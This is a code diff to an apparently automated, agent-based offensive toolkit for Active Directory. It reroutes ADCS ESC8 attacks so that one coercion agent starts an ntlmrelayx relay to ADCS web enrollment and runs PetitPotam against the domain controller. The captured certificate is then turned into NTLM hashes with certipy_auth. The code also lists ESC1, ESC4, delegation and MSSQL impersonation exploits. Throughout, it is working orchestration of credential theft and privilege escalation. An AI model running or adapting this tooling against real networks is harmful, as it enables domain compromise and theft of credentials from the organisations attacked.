@@ -685,8 +685,11 @@ class OrchestratorTools(Toolset):
 
         The privesc agent specializes in ADCS, delegation, and MSSQL attacks.
 
+        NOTE: For ADCS_ESC8 (web enrollment relay), use dispatch_esc8_attack() instead.
+        ESC8 requires ntlmrelayx which is only available on the COERCION agent.
+
         Args:
-            vuln_type: Vulnerability type - ADCS_ESC1, ADCS_ESC4, ADCS_ESC8,
+            vuln_type: Vulnerability type - ADCS_ESC1, ADCS_ESC4,
                       DELEGATION_UNCONSTRAINED, DELEGATION_CONSTRAINED, MSSQL_IMPERSONATION
             target: Target to exploit (CA name, server, etc.)
             vuln_id: Optional vulnerability ID for tracking
@@ -723,10 +726,12 @@ class OrchestratorTools(Toolset):
                 "Use get_exploitation_status() to see results."
             )
 
-        if vuln_type == "ADCS_ESC8":
-            kwargs = dict(kwargs)
-            if not kwargs.get("coerce_target"):
-                kwargs["coerce_target"] = kwargs.get("dc_host") or kwargs.get("ca_host") or target
+        # ESC8 requires ntlmrelayx on COERCION agent - redirect to dispatch_esc8_attack
+        if vuln_type.upper() == "ADCS_ESC8":
+            return (
+                "❌ ADCS_ESC8 requires ntlmrelayx which is on the COERCION agent.\n"
+                "Use dispatch_esc8_attack() instead, which coordinates relay + coercion."
+            )
 
         task_id = await self.dispatcher.request_exploit(
             vuln_type=vuln_type,
@@ -833,9 +838,9 @@ class OrchestratorTools(Toolset):
         """
         Dispatch ESC8 relay attack (ADCS Web Enrollment exploitation).
 
-        ESC8 requires coordination between PRIVESC (relay listener) and COERCION (petitpotam).
-        This tool dispatches both tasks in the correct sequence:
-        1. PRIVESC starts certipy relay to listen for relayed auth
+        ESC8 requires the COERCION agent which has both ntlmrelayx and petitpotam.
+        This tool dispatches both tasks to COERCION in sequence:
+        1. COERCION starts ntlmrelayx_to_adcs to relay auth to ADCS web enrollment
         2. COERCION runs petitpotam to coerce DC to authenticate to relay
 
         Args:
@@ -862,8 +867,10 @@ class OrchestratorTools(Toolset):
         """
         results = []
 
-        # Step 1: Dispatch ESC8 exploit to PRIVESC (starts relay listener)
-        exploit_params = {
+        # Step 1: Dispatch ESC8 relay to COERCION (starts ntlmrelayx_to_adcs listener)
+        # NOTE: ntlmrelayx is on the coercion pod, not privesc
+        relay_payload = {
+            "task_type": "esc8_relay",
             "ca_host": ca_host,
             "ca_name": ca_name or ca_host,
             "dc_ip": dc_ip,
@@ -871,20 +878,20 @@ class OrchestratorTools(Toolset):
             "username": username,
             "password": password,
             "attacker_ip": attacker_ip,
-            "coerce_target": dc_ip,  # Tell privesc where to expect coerced auth from
+            "note": f"ESC8 relay - start ntlmrelayx_to_adcs targeting {ca_host}",
         }
 
-        privesc_task_id = await self.dispatcher.request_exploit(
-            vuln_type="ADCS_ESC8",
-            vuln_id=f"ADCS_ESC8_{ca_host}",
-            target=ca_host,
+        relay_task_id = await self.dispatcher.request_coercion(
             source_agent=self._agent_name,
-            params=exploit_params,
+            interface="",  # Auto-detect on worker
+            techniques=["ntlmrelayx_to_adcs"],
+            duration=120,  # Relay needs to stay up for coercion
+            payload_override=relay_payload,
         )
 
-        if privesc_task_id:
-            results.append(f"✓ Relay listener task dispatched to PRIVESC: {privesc_task_id}")
-            logger.info(f"ESC8 relay task {privesc_task_id} dispatched to privesc")
+        if relay_task_id:
+            results.append(f"✓ Relay listener task dispatched to COERCION: {relay_task_id}")
+            logger.info(f"ESC8 relay task {relay_task_id} dispatched to coercion")
         else:
             results.append(
                 "✗ Relay listener task dropped (throttled or low priority in current phase)"
@@ -919,10 +926,10 @@ class OrchestratorTools(Toolset):
         # Provide next steps
         results.append("")
         results.append("📋 ESC8 Attack Workflow:")
-        results.append("  1. PRIVESC will start certipy relay listener")
-        results.append("  2. COERCION will run petitpotam against DC")
+        results.append("  1. COERCION starts ntlmrelayx_to_adcs relay listener")
+        results.append("  2. COERCION runs petitpotam to coerce DC")
         results.append("  3. DC authenticates to relay, capturing certificate")
-        results.append("  4. PRIVESC uses certipy_auth with captured cert for NTLM hash")
+        results.append("  4. Use certipy_auth with captured cert for NTLM hash")
         results.append("")
         results.append("→ Monitor with get_pending_tasks()")
         results.append("→ Check results with get_all_hashes() after completion")
